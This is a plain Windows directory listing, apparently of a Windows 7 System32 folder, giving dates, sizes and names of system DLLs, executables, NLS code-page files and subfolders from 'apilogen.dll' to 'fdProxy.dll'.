14/07/2009  01:40            17,920 apilogen.dll
14/07/2009  01:40           273,920 apircl.dll
02/09/2016  15:30             6,656 apisetschema.dll
29/10/2015  17:50           342,016 apphelp.dll
14/07/2009  01:40            33,792 Apphlpdm.dll
02/09/2016  15:30            59,904 appidapi.dll
02/09/2016  15:02            17,920 appidcertstorecheck.exe
02/09/2016  15:02           148,480 appidpolicyconverter.exe
14/07/2009  01:40           312,320 AppIdPolicyEngineApi.dll
02/09/2016  15:30            34,816 appidsvc.dll
04/05/2016  17:16            70,144 appinfo.dll
14/07/2009  01:40           193,536 appmgmts.dll
21/11/2010  03:24           479,232 appmgr.dll
16/07/2017  02:18    <DIR>          appraiser
03/05/2017  13:05         1,555,968 appraiser.dll
21/11/2010  03:24           726,528 appwiz.cpl
14/07/2009  01:40           243,200 apss.dll
14/07/2009  03:20    <DIR>          ar-SA
14/07/2009  01:38            24,064 ARP.EXE
14/07/2009  01:24             2,048 asferror.dll
26/03/2017  19:29            30,400 aspnet_counters.dll
12/05/2016  17:14            84,992 asycfilt.dll
14/07/2009  01:38            28,672 at.exe
14/07/2009  01:38            35,328 AtBroker.exe
14/07/2009  01:40            90,624 atl.dll
30/07/2015  16:52           372,736 atmfd.dll
30/07/2015  18:06            46,080 atmlib.dll
14/07/2009  01:38            18,432 attrib.exe
21/11/2010  03:24           126,464 audiodg.exe
14/07/2009  01:40           440,832 AudioEng.dll
14/07/2009  01:41           499,712 AUDIOKSE.dll
21/11/2010  03:24           296,448 AudioSes.dll
21/11/2010  03:24           679,424 audiosrv.dll
14/07/2009  01:40           194,048 auditcse.dll
14/07/2009  01:40           220,672 AuditNativeSnapIn.dll
02/09/2016  15:01            64,000 auditpol.exe
14/07/2009  01:40            75,264 AuditPolicyGPInterop.dll
14/07/2009  01:25            95,232 auditpolmsg.dll
14/07/2009  01:40           491,520 authfwcfg.dll
14/07/2009  01:40           304,128 AuthFWGP.dll
21/11/2010  03:24         5,066,752 AuthFWSnapin.dll
14/07/2009  01:54           126,976 AuthFWWizFwk.dll
29/08/2016  15:31         1,941,504 authui.dll
14/07/2009  01:40           177,664 authz.dll
21/11/2010  03:24           777,728 autochk.exe
21/11/2010  03:24           793,088 autoconv.exe
21/11/2010  03:24           763,904 autofmt.exe
21/11/2010  03:23           155,136 autoplay.dll
14/07/2009  01:40           164,352 AuxiliaryDisplayApi.dll
14/07/2009  01:40           136,192 AuxiliaryDisplayClassInstaller.dll
21/11/2010  03:25           726,528 AuxiliaryDisplayCpl.dll
14/07/2009  01:40           189,440 AuxiliaryDisplayDriverLib.dll
21/11/2010  03:25           135,680 AuxiliaryDisplayServices.dll
14/07/2009  01:40            76,800 avicap32.dll
14/07/2009  01:40           108,544 avifil32.dll
14/07/2009  01:40            18,432 avrt.dll
21/11/2010  03:24           114,688 AxInstSv.dll
14/07/2009  01:38            58,880 AxInstUI.exe
10/06/2009  20:38            41,587 azman.msc
21/11/2010  03:24           897,536 azroles.dll
21/11/2010  03:23           472,064 azroleui.dll
21/11/2010  03:24            31,744 AzSqlExt.dll
21/11/2010  03:24           166,784 basecsp.dll
15/07/2015  03:19            52,736 basesrv.dll
21/11/2010  03:24           749,568 batmeter.dll
14/07/2009  01:40           103,424 batt.dll
21/11/2010  03:24           175,616 bcdboot.exe
21/11/2010  03:24           346,112 bcdedit.exe
14/07/2009  01:40            77,824 bcdprov.dll
21/11/2010  03:24           168,448 bcdsrv.dll
14/07/2009  01:40           123,904 bcrypt.dll
12/05/2016  13:05           297,984 bcryptprimitives.dll
14/07/2009  01:38           104,448 bdaplgin.ax
14/07/2009  01:40            62,976 bderepair.dll
14/07/2009  01:40           100,864 bdesvc.dll
14/07/2009  01:40            28,160 bdeui.dll
14/07/2009  01:38            48,640 BdeUISrv.exe
14/07/2009  01:38            98,304 BdeUnlockWizard.exe
21/11/2010  03:24           705,024 BFE.DLL
14/07/2009  03:20    <DIR>          bg-BG
14/07/2009  01:40            43,008 bidispl.dll
21/11/2010  03:24           504,320 biocpl.dll
14/07/2009  01:40           190,976 BioCredProv.dll
21/11/2010  03:23           232,448 bitsadmin.exe
14/07/2009  01:40            56,832 bitsigd.dll
21/11/2010  03:23            24,576 bitsperf.dll
14/07/2009  01:40            12,800 bitsprx2.dll
14/07/2009  01:40            13,312 bitsprx3.dll
14/07/2009  01:40            12,288 bitsprx4.dll
14/07/2009  01:40            33,280 bitsprx5.dll
14/07/2009  01:40            13,312 bitsprx6.dll
21/11/2010  03:24           840,192 blackbox.dll
21/11/2010  03:25            52,736 BlbEvents.dll
14/07/2009  01:25             2,048 blbres.dll
14/07/2009  01:40            28,672 blb_ps.dll
16/07/2017  20:21    <DIR>          Boot
10/06/2009  21:06         3,170,304 boot.sdi
14/07/2009  01:38            94,720 bootcfg.exe
21/11/2010  03:24         2,217,856 bootres.dll
14/07/2009  01:25             2,560 bootstr.dll
14/07/2009  01:52            23,120 BOOTVID.DLL
10/06/2009  20:48            22,984 bopomofo.uce
14/07/2009  01:40            19,456 brcoinst.dll
14/07/2009  01:40            27,648 brdgcfg.dll
14/07/2009  01:25             2,048 bridgeres.dll
14/07/2009  01:38            20,992 bridgeunattend.exe
04/07/2012  22:13            59,392 browcli.dll
04/07/2012  22:13           136,704 browser.dll
21/11/2010  03:24            14,336 browseui.dll
14/07/2009  01:40            42,496 bthci.dll
14/07/2009  01:40            30,720 BthMtpContextHandler.dll
14/07/2009  01:40            30,720 bthpanapi.dll
14/07/2009  01:40            93,696 BthpanContextHandler.dll
21/11/2010  03:24           721,408 bthprops.cpl
14/07/2009  01:40            83,968 bthserv.dll
14/07/2009  01:38            36,864 bthudtask.exe
14/07/2009  01:40            74,240 btpanui.dll
21/11/2010  03:24           899,584 Bubbles.scr
14/07/2009  01:40            69,120 BWContextHandler.dll
21/11/2010  03:24            14,848 BWUnpairElevated.dll
21/11/2010  03:24            94,720 cabinet.dll
21/11/2010  03:24           139,264 cabview.dll
14/07/2009  01:38            31,232 cacls.exe
14/07/2009  01:38           918,528 calc.exe
04/03/2014  09:43            53,760 capiprovider.dll
14/07/2009  01:40            25,088 capisp.dll
15/07/2017  17:32    <DIR>          catroot
15/01/2021  09:45    <DIR>          catroot2
14/07/2009  01:40           472,576 catsrv.dll
14/07/2009  01:40            56,320 catsrvps.dll
11/11/2015  18:53           525,312 catsrvut.dll
21/11/2010  03:24            95,232 cca.dll
21/11/2010  03:24           144,384 cdd.dll
06/06/2012  06:02         1,133,568 cdosys.dll
03/05/2017  13:05           311,296 centel.dll
07/12/2012  11:19            55,296 cero.rs
02/09/2016  15:30           463,872 certcli.dll
14/07/2009  01:40           129,024 certCredProvider.dll
13/05/2013  05:50            52,224 certenc.dll
21/11/2010  03:24         1,975,296 CertEnroll.dll
14/07/2009  01:38            70,144 CertEnrollCtrl.exe
14/07/2009  01:40           297,984 CertEnrollUI.dll
21/11/2010  03:24         1,796,096 certmgr.dll
10/06/2009  20:56            63,070 certmgr.msc
21/11/2010  03:24            71,680 CertPolEng.dll
21/11/2010  03:24            80,384 certprop.dll
14/07/2009  01:38           326,144 certreq.exe
13/05/2013  03:43         1,192,448 certutil.exe
02/06/2015  00:07           254,976 cewmdm.dll
14/07/2009  01:40            57,344 cfgbkend.dll
21/11/2010  03:24           207,872 cfgmgr32.dll
14/07/2009  01:28           175,104 chajei.ime
21/11/2010  03:24            16,896 change.exe
30/10/2014  02:03           165,888 charmap.exe
13/07/2009  23:25            12,800 chcp.com
21/11/2010  03:24            22,528 chglogon.exe
21/11/2010  03:24            24,064 chgport.exe
21/11/2010  03:24            21,504 chgusr.exe
14/07/2009  01:38            36,864 chkdsk.exe
14/07/2009  01:38            18,944 chkntfs.exe
14/07/2009  01:40            22,528 chkwudrv.dll
21/11/2010  03:24            36,864 choice.exe
14/07/2009  01:41         1,675,776 chsbrkr.dll
14/07/2009  01:41         6,100,480 chtbrkr.dll
14/07/2009  01:40            12,800 CHxReadingStringIME.dll
28/06/2014  00:21           457,400 ci.dll
14/07/2009  01:40           211,968 cic.dll
14/07/2009  01:28           175,104 cintlgnt.ime
14/07/2009  01:38            43,008 cipher.exe
14/07/2009  01:40             9,728 CIRCoInst.dll
14/07/2009  01:40            17,408 clb.dll
14/07/2009  01:40           607,744 clbcatq.dll
14/07/2009  01:38           216,064 cleanmgr.exe
04/03/2015  04:55           367,552 clfs.sys
04/03/2015  04:41            79,360 clfsw32.dll
14/07/2009  01:40           102,400 cliconfg.dll
14/07/2009  01:38            49,152 cliconfg.exe
14/07/2009  00:28            40,960 cliconfg.rll
14/07/2009  01:38            32,256 clip.exe
21/11/2010  03:24           314,368 clusapi.dll
14/07/2009  01:40            37,376 cmcfg32.dll
21/11/2010  03:23           345,088 cmd.exe
14/07/2009  01:40           525,312 cmdial32.dll
14/07/2009  01:39            16,384 cmdkey.exe
14/07/2009  01:39            80,384 cmdl32.exe
14/07/2009  01:40            82,944 cmicryptinstall.dll
14/07/2009  01:40            80,384 cmifw.dll
14/07/2009  01:40           472,064 cmipnpinstall.dll
14/07/2009  01:40            41,984 cmlua.dll
14/07/2009  01:39            45,056 cmmon32.exe
14/07/2009  01:40            28,672 cmpbk32.dll
21/11/2010  03:24            92,160 cmstp.exe
14/07/2009  01:40            18,432 cmstplua.dll
14/07/2009  01:40            58,880 cmutil.dll
14/07/2009  01:40            18,944 cngaudit.dll
04/03/2014  09:43            57,344 cngprovider.dll
14/07/2009  01:40            38,400 cnvfat.dll
07/12/2012  11:19            40,960 cob-au.rs
16/07/2017  02:18    <DIR>          CodeIntegrity
14/07/2009  01:39            22,528 cofire.exe
14/07/2009  01:40            32,256 cofiredm.dll
14/07/2009  01:40            80,384 colbact.dll
14/07/2009  01:38            85,504 collab.cpl
08/12/2015  19:07           189,952 COLORCNV.DLL
14/07/2009  01:39            86,528 colorcpl.exe
14/07/2009  01:40           624,640 colorui.dll
12/04/2011  07:45    <DIR>          com
14/07/2009  01:40             8,704 comcat.dll
24/04/2015  18:17           633,856 comctl32.dll
21/11/2010  03:24           594,432 comdlg32.dll
10/06/2009  20:34           124,118 comexp.msc
14/07/2009  01:39            24,064 comp.exe
14/07/2009  01:39            19,968 compact.exe
03/05/2017  15:34            94,952 CompatTelRunner.exe
10/06/2009  20:38           113,256 compmgmt.msc
14/07/2009  01:39           145,920 CompMgmtLauncher.exe
14/07/2009  01:40           302,080 compstui.dll
14/07/2009  01:39            37,376 ComputerDefaults.exe
14/07/2009  01:40           147,456 comrepl.dll
14/07/2009  01:26         1,297,408 comres.dll
14/07/2009  01:40           303,616 comsnap.dll
11/11/2015  18:53         1,735,680 comsvcs.dll
14/07/2009  01:40           897,024 comuid.dll
18/02/2021  15:43    <DIR>          config
02/09/2016  14:58           338,432 conhost.exe
14/07/2009  01:40         1,393,152 connect.dll
04/05/2016  17:21           114,408 consent.exe
14/07/2009  01:40            80,896 console.dll
14/07/2009  01:39           114,688 control.exe
14/07/2009  01:39            20,480 convert.exe
14/07/2009  01:40            87,040 correngine.dll
22/01/2016  06:18           961,024 CPFilters.dll
02/09/2016  15:30            22,016 credssp.dll
04/10/2013  02:25           197,120 credui.dll
14/07/2009  01:39            34,304 credwiz.exe
14/07/2009  01:40            66,560 CRPPresentation.dll
06/06/2016  16:50         1,483,264 crypt32.dll
02/09/2016  15:30            43,520 cryptbase.dll
10/05/2013  05:49            30,720 cryptdlg.dll
14/07/2009  01:40            66,048 cryptdll.dll
14/07/2009  01:40            66,560 cryptext.dll
06/06/2016  16:50           141,824 cryptnet.dll
14/07/2009  01:40            79,872 cryptsp.dll
06/06/2016  16:50           190,976 cryptsvc.dll
21/11/2010  03:24         1,065,984 cryptui.dll
14/07/2009  01:40           130,560 cryptxml.dll
15/07/2017  07:54    <DIR>          cs-CZ
21/11/2010  03:23            46,080 cscapi.dll
21/11/2010  03:23            30,208 cscdll.dll
21/11/2010  03:24           137,216 CscMig.dll
21/11/2010  03:24           240,640 cscobj.dll
12/10/2013  01:33           156,160 cscript.exe
21/11/2010  03:24           692,224 cscsvc.dll
21/11/2010  03:24           498,688 cscui.dll
07/12/2012  11:20            43,520 csrr.rs
02/09/2016  15:30            44,032 csrsrv.dll
14/07/2009  01:39             7,680 csrss.exe
14/07/2009  01:39             9,728 ctfmon.exe
14/07/2009  01:39           322,048 cttune.exe
14/07/2009  01:39            40,448 cttunesvr.exe
10/06/2009  21:10            66,082 C_037.NLS
10/06/2009  21:10            66,082 C_10000.NLS
10/06/2009  21:10           162,850 C_10001.NLS
10/06/2009  21:10           195,618 C_10002.NLS
10/06/2009  21:10           177,698 C_10003.NLS
10/06/2009  21:10            66,082 C_10004.NLS
10/06/2009  21:10            66,082 C_10005.NLS
10/06/2009  21:10            66,082 C_10006.NLS
10/06/2009  21:10            66,082 C_10007.NLS
10/06/2009  21:10           173,602 C_10008.NLS
10/06/2009  21:10            66,082 C_10010.NLS
10/06/2009  21:10            66,082 C_10017.NLS
10/06/2009  21:10            66,082 C_10021.NLS
10/06/2009  21:10            66,082 C_10029.NLS
10/06/2009  21:10            66,082 C_10079.NLS
10/06/2009  21:10            66,082 C_10081.NLS
10/06/2009  21:10            66,082 C_10082.NLS
10/06/2009  21:10            66,082 C_1026.NLS
10/06/2009  21:10            66,082 C_1047.NLS
10/06/2009  21:10            66,082 C_1140.NLS
10/06/2009  21:10            66,082 C_1141.NLS
10/06/2009  21:10            66,082 C_1142.NLS
10/06/2009  21:10            66,082 C_1143.NLS
10/06/2009  21:10            66,082 C_1144.NLS
10/06/2009  21:10            66,082 C_1145.NLS
10/06/2009  21:10            66,082 C_1146.NLS
10/06/2009  21:10            66,082 C_1147.NLS
10/06/2009  21:10            66,082 C_1148.NLS
10/06/2009  21:10            66,082 C_1149.NLS
10/06/2009  21:10            66,082 C_1250.NLS
10/06/2009  21:10            66,082 C_1251.NLS
10/06/2009  21:10            66,082 C_1252.NLS
10/06/2009  21:10            66,082 C_1253.NLS
10/06/2009  21:10            66,082 C_1254.NLS
10/06/2009  21:10            66,082 C_1255.NLS
10/06/2009  21:10            66,082 C_1256.NLS
10/06/2009  21:10            66,082 C_1257.NLS
10/06/2009  21:10            66,082 C_1258.NLS
10/06/2009  21:10           189,986 C_1361.NLS
10/06/2009  21:10           180,258 C_20000.NLS
10/06/2009  21:10           186,402 C_20001.NLS
10/06/2009  21:10           173,602 C_20002.NLS
10/06/2009  21:10           185,378 C_20003.NLS
10/06/2009  21:10           180,258 C_20004.NLS
10/06/2009  21:10           187,938 C_20005.NLS
10/06/2009  21:10            66,082 C_20105.NLS
10/06/2009  21:10            66,082 C_20106.NLS
10/06/2009  21:10            66,082 C_20107.NLS
10/06/2009  21:10            66,082 C_20108.NLS
10/06/2009  21:10            66,082 C_20127.NLS
10/06/2009  21:10           139,810 C_20261.NLS
10/06/2009  21:10            66,082 C_20269.NLS
10/06/2009  21:10            66,082 C_20273.NLS
10/06/2009  21:10            66,082 C_20277.NLS
10/06/2009  21:10            66,082 C_20278.NLS
10/06/2009  21:10            66,082 C_20280.NLS
10/06/2009  21:10            66,082 C_20284.NLS
10/06/2009  21:10            66,082 C_20285.NLS
10/06/2009  21:10            66,082 C_20290.NLS
10/06/2009  21:10            66,082 C_20297.NLS
10/06/2009  21:10            66,082 C_20420.NLS
10/06/2009  21:10            66,082 C_20423.NLS
10/06/2009  21:10            66,082 C_20424.NLS
10/06/2009  21:10            66,082 C_20833.NLS
10/06/2009  21:10            66,082 C_20838.NLS
10/06/2009  21:10            66,082 C_20866.NLS
10/06/2009  21:10            66,082 C_20871.NLS
10/06/2009  21:10            66,082 C_20880.NLS
10/06/2009  21:10            66,082 C_20905.NLS
10/06/2009  21:10            66,082 C_20924.NLS
10/06/2009  21:10           180,770 C_20932.NLS
10/06/2009  21:10           173,602 C_20936.NLS
10/06/2009  21:10           177,698 C_20949.NLS
10/06/2009  21:10            66,082 C_21025.NLS
10/06/2009  21:10            66,082 C_21027.NLS
10/06/2009  21:10            66,082 C_21866.NLS
10/06/2009  21:10            66,082 C_28591.NLS
10/06/2009  21:10            66,082 C_28592.NLS
10/06/2009  21:10            66,082 C_28593.NLS
10/06/2009  21:10            66,082 C_28594.NLS
10/06/2009  21:10            66,082 C_28595.NLS
10/06/2009  21:10            66,082 C_28596.NLS
10/06/2009  21:10            66,082 C_28597.NLS
10/06/2009  21:10            66,082 C_28598.NLS
10/06/2009  21:10            66,082 C_28599.NLS
10/06/2009  21:10            66,082 c_28603.nls
10/06/2009  21:10            66,082 C_28605.NLS
10/06/2009  21:10            66,594 C_437.NLS
10/06/2009  21:10            66,082 C_500.NLS
10/06/2009  21:10            66,082 C_708.NLS
10/06/2009  21:10            66,594 C_720.NLS
10/06/2009  21:10            66,594 C_737.NLS
10/06/2009  21:10            66,594 C_775.NLS
10/06/2009  21:10            66,594 C_850.NLS
10/06/2009  21:10            66,594 C_852.NLS
10/06/2009  21:10            66,594 C_855.NLS
10/06/2009  21:10            66,594 C_857.NLS
10/06/2009  21:10            66,594 C_858.NLS
10/06/2009  21:10            66,594 C_860.NLS
10/06/2009  21:10            66,594 C_861.NLS
10/06/2009  21:10            66,594 C_862.NLS
10/06/2009  21:10            66,594 C_863.NLS
10/06/2009  21:10            66,594 C_864.NLS
10/06/2009  21:10            66,594 C_865.NLS
10/06/2009  21:10            66,594 C_866.NLS
10/06/2009  21:10            66,594 C_869.NLS
10/06/2009  21:10            66,082 C_870.NLS
10/06/2009  21:10            66,594 C_874.NLS
10/06/2009  21:10            66,082 C_875.NLS
10/06/2009  21:10           162,850 C_932.NLS
10/06/2009  21:10           196,642 C_936.NLS
10/06/2009  21:10           196,642 C_949.NLS
10/06/2009  21:10           196,642 C_950.NLS
14/07/2009  01:40           223,744 C_G18030.DLL
14/07/2009  01:40            12,800 C_IS2022.DLL
21/11/2010  03:24            13,312 C_ISCII.DLL
22/11/2013  22:48         3,928,064 d2d1.dll
14/07/2017  17:51         1,238,528 d3d10.dll
14/07/2017  17:51           296,960 d3d10core.dll
14/04/2016  13:21           647,680 d3d10level9.dll
30/07/2015  18:06         2,565,120 d3d10warp.dll
14/07/2017  17:51           194,560 d3d10_1.dll
14/07/2017  17:51           333,312 d3d10_1core.dll
31/03/2013  22:52         1,887,232 d3d11.dll
14/07/2009  01:40            12,288 d3d8thk.dll
21/11/2010  03:24         2,067,456 d3d9.dll
15/07/2017  07:54    <DIR>          da-DK
14/07/2009  01:40            21,504 dataclen.dll
21/11/2010  03:24           100,864 davclnt.dll
14/07/2009  01:40            25,600 davhlpr.dll
21/11/2010  03:24         3,391,488 dbgeng.dll
21/11/2010  03:24         1,087,488 dbghelp.dll
14/07/2009  01:40           147,456 dbnetlib.dll
14/07/2009  01:40            40,960 dbnmpntw.dll
14/07/2009  01:39           881,664 dccw.exe
30/07/2015  18:06            14,336 dciman32.dll
14/07/2009  01:39            10,240 dcomcnfg.exe
14/07/2009  01:40            17,408 DDACLSys.dll
14/07/2009  01:39            43,008 ddodiag.exe
14/07/2009  01:40            27,136 DDOIProxy.dll
14/07/2009  01:40         6,281,216 DDORes.dll
14/07/2009  01:40           569,344 ddraw.dll
14/07/2009  01:40            40,448 ddrawex.dll
15/07/2017  07:54    <DIR>          de-DE
21/11/2010  03:24           233,984 defaultlocationcpl.dll
14/07/2009  01:39           183,296 Defrag.exe
14/07/2009  01:40            16,384 defragproxy.dll
14/07/2009  01:40           291,328 defragsvc.dll
21/11/2010  03:23           130,048 desk.cpl
14/07/2009  01:40            49,664 deskadp.dll
14/07/2009  01:40            48,128 deskmon.dll
14/07/2009  01:40            41,472 deskperf.dll
08/12/2015  19:07            76,288 devenum.dll
21/11/2010  03:23           508,928 DeviceCenter.dll
14/07/2009  01:39           111,616 DeviceDisplayObjectProvider.exe
14/07/2009  01:40            20,480 DeviceDisplayStatusManager.dll
14/07/2009  01:39            25,600 DeviceEject.exe
14/07/2009  01:40            28,672 DeviceMetadataParsers.dll
14/07/2009  01:40           189,952 DevicePairing.dll
21/11/2010  03:24           225,280 DevicePairingFolder.dll
14/07/2009  01:40            87,552 DevicePairingHandler.dll
14/07/2009  01:40            58,368 DevicePairingProxy.dll
14/07/2009  01:39            74,752 DevicePairingWizard.exe
14/07/2009  01:39            92,672 DeviceProperties.exe
14/07/2009  01:40            10,240 DeviceUxRes.dll
03/05/2017  13:05           535,552 devinv.dll
10/06/2009  21:07           145,640 devmgmt.msc
14/07/2009  01:40           528,896 devmgr.dll
14/07/2009  01:40            93,184 devobj.dll
14/07/2009  01:40            58,368 devrtl.dll
14/07/2009  01:40            45,568 dfdts.dll
14/07/2009  01:39            79,360 DFDWiz.exe
21/11/2010  03:24           606,208 dfrgui.exe
14/07/2009  01:40            62,976 dfscli.dll
18/06/2014  22:23         1,943,696 dfshim.dll
14/07/2009  01:40            68,096 DfsShlEx.dll
14/07/2009  01:40            13,824 dhcpcmonitor.dll
21/11/2010  03:24           317,952 dhcpcore.dll
09/10/2012  18:17           226,816 dhcpcore6.dll
14/07/2009  01:40            87,040 dhcpcsvc.dll
09/10/2012  18:17            55,296 dhcpcsvc6.dll
14/07/2009  01:40           101,888 DHCPQEC.DLL
14/07/2009  01:40           114,688 dhcpsapi.dll
21/11/2010  03:24         1,202,176 DiagCpl.dll
21/11/2010  03:24         1,340,416 diagperf.dll
23/07/2015  00:02         1,390,592 diagtrack.dll
14/07/2009  01:39            35,328 dialer.exe
14/07/2009  01:39           116,224 diantz.exe
14/07/2009  01:40           504,320 difxapi.dll
14/07/2009  01:40            40,448 dimsjob.dll
04/03/2014  09:43            44,544 dimsroam.dll
14/07/2009  01:39             8,704 dinotify.exe
14/07/2009  01:40           173,056 dinput.dll
14/07/2009  01:40           195,584 dinput8.dll
13/07/2009  23:25            15,360 diskcomp.com
13/07/2009  23:25            12,800 diskcopy.com
14/07/2009  01:40         1,502,208 diskcopy.dll
10/06/2009  21:08            47,679 diskmgmt.msc
21/11/2010  03:24           166,400 diskpart.exe
25/05/2015  18:18            19,456 diskperf.exe
21/11/2010  03:24           363,520 diskraid.exe
16/07/2017  20:21    <DIR>          Dism
14/07/2009  01:39           274,944 Dism.exe
14/07/2009  01:40            47,616 dispci.dll
14/07/2009  01:39           159,232 dispdiag.exe
14/07/2009  01:40            18,944 dispex.dll
21/11/2010  03:24         1,066,496 Display.dll
14/07/2009  01:39           529,408 DisplaySwitch.exe
07/12/2012  11:19            15,360 djctq.rs
21/11/2010  03:24            61,440 djoin.exe
14/07/2009  01:39             9,728 dllhost.exe
14/07/2009  01:39             8,192 dllhst3g.exe
14/07/2009  01:40           487,424 dmdlgs.dll
14/07/2009  01:40           282,112 dmdskmgr.dll
14/07/2009  01:26           372,224 dmdskres.dll
14/07/2009  01:26             2,048 dmdskres2.dll
14/07/2009  01:40            60,928 dmintf.dll
14/07/2009  01:40            47,616 dmloader.dll
14/07/2009  01:40            49,664 dmocx.dll
14/07/2009  01:40           135,168 dmrc.dll
14/07/2009  01:40           119,296 dmsynth.dll
14/07/2009  01:40           125,952 dmusic.dll
14/07/2009  01:40            24,064 dmutil.dll
14/07/2009  01:40           221,184 dmvdsitf.dll
14/07/2009  01:38           147,456 dmview.ocx
21/11/2010  03:23            33,280 dmvscres.dll
03/03/2011  06:24           357,888 dnsapi.dll
03/03/2011  06:21            30,208 dnscacheugc.exe
21/11/2010  03:24           118,272 dnscmmc.dll
14/07/2009  01:40             8,192 dnsext.dll
14/07/2009  01:40           104,960 dnshc.dll
03/03/2011  06:24           183,296 dnsrslvr.dll
14/07/2009  01:40            43,520 docprop.dll
14/07/2009  01:26            51,200 DocumentPerformanceEvents.dll
14/07/2009  01:39            18,944 doskey.exe
21/11/2010  03:24            84,992 dot3api.dll
21/11/2010  03:24            69,120 dot3cfg.dll
14/07/2009  01:40            57,856 dot3dlg.dll
14/07/2009  01:40            56,832 dot3gpclnt.dll
14/07/2009  01:40           280,064 dot3gpui.dll
14/07/2009  01:40            69,632 dot3hc.dll
21/11/2010  03:24           103,936 dot3msm.dll
21/11/2010  03:24           252,416 dot3svc.dll
21/11/2010  03:24           313,344 dot3ui.dll
14/07/2009  01:39            74,752 dpapimig.exe
04/03/2014  09:43            52,736 dpapiprovider.dll
14/07/2009  01:39            77,312 DpiScaling.exe
21/11/2010  03:24             3,072 dpnaddr.dll
14/07/2009  01:40            68,608 dpnathlp.dll
02/11/2012  05:59           478,208 dpnet.dll
14/07/2009  01:40             8,704 dpnhpast.dll
14/07/2009  01:40             8,704 dpnhupnp.dll
14/07/2009  01:26             3,072 dpnlobby.dll
14/07/2009  01:39            34,304 dpnsvr.exe
21/11/2010  03:24           162,816 dps.dll
21/11/2010  03:24           399,872 dpx.dll
14/07/2009  01:39            96,256 driverquery.exe
24/12/2017  02:23    <DIR>          drivers
24/12/2017  02:23    <DIR>          DriverStore
21/11/2010  03:24           495,104 drmmgrtn.dll
14/07/2009  01:40         1,200,640 drmv2clt.dll
14/07/2009  01:40            24,576 drprov.dll
14/07/2009  01:40           293,888 drt.dll
14/07/2009  01:40            68,608 drtprov.dll
14/07/2009  01:40            53,248 drttransport.dll
14/07/2009  01:39           102,912 drvinst.exe
24/12/2017  02:23    <DIR>          DRVSTORE
21/11/2010  03:24           422,912 drvstore.dll
14/07/2009  01:40            28,672 ds32gt.dll
21/11/2010  03:24            36,864 dsauth.dll
14/07/2009  01:40           193,536 dsdmo.dll
21/11/2010  03:24           281,600 DShowRdpFilter.dll
14/07/2009  01:40           115,200 dskquota.dll
21/11/2010  03:24           239,616 dskquoui.dll
14/07/2009  01:40           540,672 dsound.dll
14/07/2009  01:40           190,976 dsprop.dll
14/07/2009  01:40           429,056 dsquery.dll
14/07/2009  01:40            32,768 dsrole.dll
10/06/2009  20:53           215,943 dssec.dat
14/07/2009  01:40            55,808 dssec.dll
14/07/2009  01:43           190,880 dssenh.dll
21/11/2010  03:23           701,440 dsuiext.dll
14/07/2009  01:40            25,088 dswave.dll
14/07/2009  01:40            36,352 dtsh.dll
14/07/2009  01:40           976,896 dui70.dll
14/07/2009  01:40           260,608 duser.dll
14/07/2009  01:39            11,264 dvdplay.exe
14/07/2009  01:39            26,112 dvdupgrd.exe
14/07/2009  01:39           120,320 dwm.exe
09/07/2015  17:58            82,944 dwmapi.dll
09/07/2015  17:58         1,632,256 dwmcore.dll
21/11/2010  03:24           128,512 dwmredir.dll
30/07/2015  18:06         1,648,128 DWrite.dll
14/07/2009  01:39           152,576 DWWIN.EXE
14/07/2009  01:39           343,552 dxdiag.exe
21/11/2010  03:24           279,552 dxdiagn.dll
14/07/2017  17:51           363,008 dxgi.dll
21/11/2010  03:24             5,120 dxmasf.dll
21/11/2010  03:23           459,776 DXP.dll
14/07/2009  01:40            40,448 dxpps.dll
14/07/2009  01:39           265,216 Dxpserver.exe
21/11/2010  03:24           675,328 DXPTaskRingtone.dll
21/11/2010  03:24         1,457,664 DxpTaskSync.dll
14/07/2017  18:04           490,496 dxtmsft.dll
14/07/2017  18:04           316,928 dxtrans.dll
14/07/2009  01:40           117,248 dxva2.dll
14/07/2009  01:39            11,776 Eap3Host.exe
21/11/2010  03:24           348,160 eapp3hst.dll
14/07/2009  01:40           263,680 eappcfg.dll
21/11/2010  03:24           103,936 eappgnui.dll
21/11/2010  03:24           303,616 eapphost.dll
14/07/2009  01:40            64,512 eappprxy.dll
14/07/2009  01:40            91,648 EAPQEC.DLL
14/07/2009  01:40           111,104 eapsvc.dll
14/07/2009  01:40            97,280 efsadu.dll
21/11/2010  03:24           304,128 efscore.dll
14/07/2009  01:40            56,832 efslsaext.dll
14/07/2009  01:40            37,376 efssvc.dll
14/07/2009  01:39            12,800 efsui.exe
14/07/2009  01:40            34,816 efsutil.dll
21/11/2010  03:23           144,896 EhStorAPI.dll
14/07/2009  01:39           140,288 EhStorAuthn.exe
14/07/2009  01:40           111,616 EhStorPwdMgr.dll
14/07/2009  01:40           203,264 EhStorShell.dll
15/07/2017  07:54    <DIR>          el-GR
03/11/2015  19:04           241,664 els.dll
14/07/2009  01:40            45,568 ELSCore.dll
14/07/2017  18:04           235,008 elshyph.dll
14/07/2009  01:40           647,680 elslad.dll
21/11/2010  03:24            25,600 elsTrans.dll
12/04/2011  07:45    <DIR>          en
16/07/2017  20:21    <DIR>          en-US
14/07/2009  01:40            24,576 encapi.dll
22/01/2016  06:18           723,968 EncDec.dll
14/07/2009  01:40           283,648 EncDump.dll
14/07/2009  01:40           290,304 energy.dll
14/07/2009  01:40            75,264 eqossnap.dll
15/07/2017  07:54    <DIR>          es-ES
14/07/2009  01:40           402,944 es.dll
11/03/2011  06:33         2,565,632 esent.dll
14/07/2009  01:40            39,424 esentprf.dll
14/07/2009  01:39           139,264 esentutl.exe
07/12/2012  11:19            51,712 esrb.rs
14/07/2009  03:20    <DIR>          et-EE
21/11/2010  03:24           359,936 eudcedit.exe
14/07/2009  01:40            16,384 eventcls.dll
14/07/2009  01:39            45,056 eventcreate.exe
10/06/2009  20:57            17,935 EventViewer_EventDetails.xsl
14/07/2009  01:39            81,920 eventvwr.exe
10/06/2009  20:58           145,127 eventvwr.msc
08/12/2015  19:07           632,320 evr.dll
14/07/2009  01:39            65,536 expand.exe
29/08/2016  15:31         1,867,776 ExplorerFrame.dll
14/07/2009  01:39            62,464 extrac32.exe
14/07/2009  01:27            34,816 f3ahvoas.dll
21/11/2010  03:24           355,328 Faultrep.dll
14/07/2009  01:39            24,064 fc.exe
14/07/2009  01:40           126,464 fdBth.dll
14/07/2009  01:40            11,776 fdBthProxy.dll
21/11/2010  03:24           171,520 fde.dll
21/11/2010  03:24            72,192 fdeploy.dll
14/07/2009  01:40            16,384 fdPHost.dll
14/07/2009  01:40            51,200 fdPnp.dll
14/07/2009  01:40           296,448 fdprint.dll
21/11/2010  03:24            74,240 fdProxy.dll
